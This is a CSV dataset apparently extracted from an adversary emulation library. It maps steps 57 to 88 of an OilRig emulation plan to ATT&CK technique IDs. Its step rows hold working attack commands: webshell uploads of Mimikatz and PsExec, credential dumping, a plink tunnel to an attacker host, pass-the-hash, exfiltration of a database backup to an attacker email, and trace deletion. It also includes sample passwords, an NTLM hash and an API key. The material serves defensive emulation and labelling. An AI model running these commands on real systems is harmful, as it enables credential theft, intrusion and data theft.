org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
oilrig,oilrig,unknown,oilrig::57,57,OilRig Download Mimikatz (Kali Agent),"id: f96e8195-8b0f-4b87-bdce-748dfda2861f | name: OilRig Download Mimikatz (Kali Agent) | description: Download Mimikatz | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 6.A.1 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\temp\' -F ""vir=false"" -F ""nen=m64.exe"" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx
 | payloads: m64.exe","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::58,58,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::59,59,OilRig Execute Mimikatz (Kali Agent),"id: f01e86f9-0b66-4191-beee-324c380690df | name: OilRig Execute Mimikatz (Kali Agent) | description: Dump credentials using Mimikatz | tactic: Credential Access | technique: attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory | procedure_group: procedure_credential_access | procedure_step: 6.A.2 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt"" https://#{second.target.ip}/ews/contact.aspx
","[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::60,60,OS Credential Dumping: LSASS Memory,attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory,"[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::61,61,OilRig Exfiltrate Mimikatz Output (Kali Agent),"id: 845d36f1-13b6-4d42-a384-aa2f4af9bc27 | name: OilRig Exfiltrate Mimikatz Output (Kali Agent) | description: Exfiltrate the resulting output file to the attacker system | tactic: Exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | procedure_group: procedure_exfiltration | procedure_step: 6.A.3 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx
","[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::62,62,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::63,63,OilRig Delete Mimikatz and MimiKatz Output (Kali Agent),"id: 6482ba12-fa47-409c-bab8-704de6475e38 | name: OilRig Delete Mimikatz and MimiKatz Output (Kali Agent) | description: Clean up by removing the binary and output file | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 6.A.4 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe"" https://#{second.target.ip}/EWS/contact.aspx
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::64,64,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::65,65,OilRig Download Plink,"id: f3df5a83-2a5a-4277-8763-8fb51032d3fc | name: OilRig Download Plink | description: Download Plink in order to gain RDP access
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 7.A.1 | platforms: windows: cmd: command: copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\plink.exe C:\Users\Public\Downloads\plink.exe
 | payloads: plink.exe","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::66,66,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::67,67,OilRig Run Plink,"id: 212995b5-acfc-404b-b3a9-a19cc0afa9a5 | name: OilRig Run Plink | description: Run Plink
 | tactic: Command and Control | technique: attack_id: T1572 | name: Protocol Tunneling | procedure_group: procedure_command_and_control | procedure_step: 7.A.2 | platforms: windows: proc: command: exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw ""#{caldera.user.password}"" #{caldera.server.ip}
 | timeout: 120 | input_arguments: caldera.server.ip: description: The IPv4 address of the attacker system. | type: string | default: 192.168.0.4 | caldera.user.password: description: The password for the attacker system. | type: string | default: ceKa#zUUc4^9yZ | caldera.user.name: description: The username of the attacker system. | type: string | default: saka","[""T1572""]","[""T1572""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::68,68,Protocol Tunneling,attack_id: T1572 | name: Protocol Tunneling,"[""T1572""]","[""T1572""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::69,69,OilRig RDP to WATERFALLS,"id: dc2efbdd-3ab4-44a0-9839-385540b8a8cc | name: OilRig RDP to WATERFALLS | description: RDP to 10.1.0.6 using xfreerdp
 | tactic: Lateral Movement | technique: attack_id: T1021.001 | name: Remote Services: Remote Desktop Protocol | procedure_group: procedure_lateral_movement | procedure_step: 7.A.4 | platforms: linux: proc: command: exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
","[""T1021.001""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::70,70,Remote Services: Remote Desktop Protocol,attack_id: T1021.001 | name: Remote Services: Remote Desktop Protocol,"[""T1021.001""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::71,71,OilRig Downloads PsExec,"id: 5cb977ae-87c8-450f-b016-f414b42ba60f | name: OilRig Downloads PsExec | description: OilRig uses the webshell to download PsExec as ps.exe to WATERFALLS | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 8.A.2 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=ps.exe"" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx
 | payloads: PsExec.exe","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::72,72,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::73,73,OilRig Downloads RDAT,"id: d5b83af2-b79e-438d-acfc-2641282df698 | name: OilRig Downloads RDAT | description: OilRig uses the webshell to download RDAT as nt.dat to WATERFALLS | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 8.A.3 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\Temp' -F ""vir=false"" -F ""nen=Nt.dat"" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx
 | payloads: RDAT.exe","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::74,74,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::75,75,OilRig Downloads mom64.exe,"id: 98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2 | name: OilRig Downloads mom64.exe | description: OilRig uses the webshell to download Mimikatz as mom64.exe to WATERFALLS | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 8.A.4 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F ""upl=f1"" -F 'sav=C:\Windows\System32' -F ""vir=false"" -F ""nen=mom64.exe"" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx
 | payloads: m64.exe","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::76,76,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::77,77,OilRig PSEXEC is used to execute commands on ENDOFROAD,"id: 44073aa3-70e9-4a48-86b7-c25b6f29c25c | name: OilRig PSEXEC is used to execute commands on ENDOFROAD | description: Requires xdotool to be installed on the running machine. 
Uses xdotool to control the RDP window to 10.1.0.6 that was opened in Step 7.A.4. 
Executes Mimikatz PTH, copies RDAT to 10.1.0.7, and PsExecs to the SQL server
 | tactic: Execution | technique: attack_id: T1569.002 | name: System Services: Service Execution | procedure_group: procedure_execution | procedure_step: 8.A.9 | platforms: linux: sh: command: sleep 5;
rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
rdp_window=$(xdotool search --pid ""$rdp_pid"");
xdotool key --window ""$rdp_window"" Super_L;
sleep 5; 
xdotool windowactivate --sync ""$rdp_window"" type --delay 200 ""cmd"";
sleep 3; 
xdotool key --window ""$rdp_window"" Ctrl+Shift+Return;
sleep 3; 
xdotool key --window ""$rdp_window"" Tab Tab;
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'C:\Windows\System32\mom64.exe ""privilege::debug"" ""sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}""';
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'copy C:\Windows\Temp\Nt.dat \\#{third.target.ip}\C$\ProgramData\';
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'C:\Windows\System32\ps.exe \\#{third.target.ip} cmd.exe';
xdotool key --window ""$rdp_window"" Return;
sleep 5;
 | timeout: 150 | input_arguments: second.target.user: description: The username for the SQL server administrator. | type: string | default: tous | second.target.ntlm: description: NTLM hash value for the user of the SQL server administrator. | type: string | default: 9b7ff4cc0878bee9f099a4a7dc7227c3 | third.target.ip: description: The IPv4 address of the SQL server. | type: string | default: 10.1.0.7","[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::78,78,System Services: Service Execution,attack_id: T1569.002 | name: System Services: Service Execution,"[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::79,79,OilRig File and Directory Discovery on ENDOFROAD,"id: f1f34439-ca0d-4fe7-99af-a198a29b6a3e | name: OilRig File and Directory Discovery on ENDOFROAD | description: Requires xdotool to be installed on the running machine. 
Uses xdotool to execute file and directory discovery commands on ENDOFROAD
 | tactic: Discovery | technique: attack_id: T1083 | name: File and Directory Discovery | procedure_group: procedure_discovery | procedure_step: 9.A.1-2 | platforms: linux: sh: command: sleep 3;
rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
rdp_window=$(xdotool search --pid ""$rdp_pid"");
sleep 3; 
xdotool type --window ""$rdp_window"" 'dir ""C:\Program Files\Microsoft SQL Server\""';
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'dir ""C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\""';
xdotool key --window ""$rdp_window"" Return;
sleep 4;
","[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::80,80,File and Directory Discovery,attack_id: T1083 | name: File and Directory Discovery,"[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::81,81,OilRig Exfiltrate Data via EWS API to attacker-controlled email,"id: 885c14a2-bc56-4176-8671-4cb25489ae39 | name: OilRig Exfiltrate Data via EWS API to attacker-controlled email | description: Requires xdotool to be installed on the running machine. 
Creates a directory to stage collected data and moves RDAT to the newly created directory.
Read and exfiltrate the data from sitedata_db.bak in chunks via EWS API to an attacker-controlled email.
 | tactic: exfiltration | technique: attack_id: T1048.003 | name: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol | procedure_group: procedure_defense_evasion | procedure_step: 10.A.6 | platforms: linux: sh: command: sleep 2;
rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
rdp_window=$(xdotool search --pid ""$rdp_pid"");
sleep 3; 
xdotool type --window ""$rdp_window"" 'mkdir C:\Programdata\Vmware';
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe';
xdotool key --window ""$rdp_window"" Return;
sleep 3;
xdotool type --window ""$rdp_window"" 'cd ""C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\""';
xdotool key --window ""$rdp_window"" Return;
sleep 3;
xdotool type --window ""$rdp_window"" 'C:\ProgramData\Vmware\VMware.exe --path=""sitedata_db.bak"" --to=""#{exfil.target.email}"" --from=""#{initial.target.user}@#{network.domain.name}"" --server=""#{second.target.ip}"" --password='#{initial.target.password}' --chunksize=""200000""';
sleep 1; 
xdotool key --window ""$rdp_window"" Return;
sleep 15;
 | input_arguments: exfil.target.email: description: The adversary-controlled email address used to exfiltrate data. | type: string | default: sistan@shirinfarhad.com","[""T1048.003""]","[""T1048""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::82,82,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,attack_id: T1048.003 | name: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,"[""T1048.003""]","[""T1048""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::83,83,OilRig Cleanup via RDP,"id: 0c5cf9e2-3152-4b4c-9629-2ed7a00da09d | name: OilRig Cleanup via RDP | description: Requires xdotool to be installed on the running machine. 
Emulates OilRig's cleanup and egress from the target network.
 | tactic: defense-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 11.A.1-3 | platforms: linux: sh: command: sleep 3;
rdp_pid=$(pgrep -f ""xfreerdp.*/v:localhost"");
rdp_window=$(xdotool search --pid ""$rdp_pid"");
sleep 3; 
xdotool type --window ""$rdp_window"" 'del C:\ProgramData\VMware\VMware.exe';
sleep 3; 
xdotool key --window ""$rdp_window"" Return;
sleep 3; 
xdotool type --window ""$rdp_window"" 'rmdir C:\ProgramData\VMware';
sleep 3; 
xdotool key --window ""$rdp_window"" Return;
sleep 1;
xdotool type --window ""$rdp_window"" 'exit';
xdotool key --window ""$rdp_window"" Return;
sleep 1;
xdotool type --window ""$rdp_window"" 'exit';
xdotool key --window ""$rdp_window"" Return;
sleep 3;
xdotool type --window ""$rdp_window"" 'exit';
xdotool key --window ""$rdp_window"" Return;
sleep 2;
xdotool type --window ""$rdp_window"" 'del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe';
xdotool key --window ""$rdp_window"" Return;
sleep 2;   
xdotool type --window ""$rdp_window"" 'exit';
xdotool key --window ""$rdp_window"" Return;
sleep 2;

kill $(ps aux | grep ""sshd: #{caldera.user.name}"" | grep -v priv | grep -v grep | awk '{print $2}')
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::84,84,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::85,85,OilRig Cleanup on Gosta,"id: d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15 | name: OilRig Cleanup on Gosta | description: Delete VALUEVAULT plink.exe.
 | tactic: defense-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 11.A.4 | platforms: windows: cmd: command: del C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe;
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::86,86,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::87,87,OilRig Kill Gosta Agent,"id: 16767c68-a865-46af-a0e4-ff8d742efc3f | name: OilRig Kill Gosta Agent | description: Gosta Agent kills itself
 | tactic: defense-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 11.A.4 | platforms: windows: cmd: command: curl -s -H ""KEY:#{server.api.key}"" -H ""Content-Type: application/json"" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d ""{\""watchdog\"":1}""
 | input_arguments: server.api.key: description: API key for the CALDERA server | type: string | default: ADMIN123","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::88,88,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
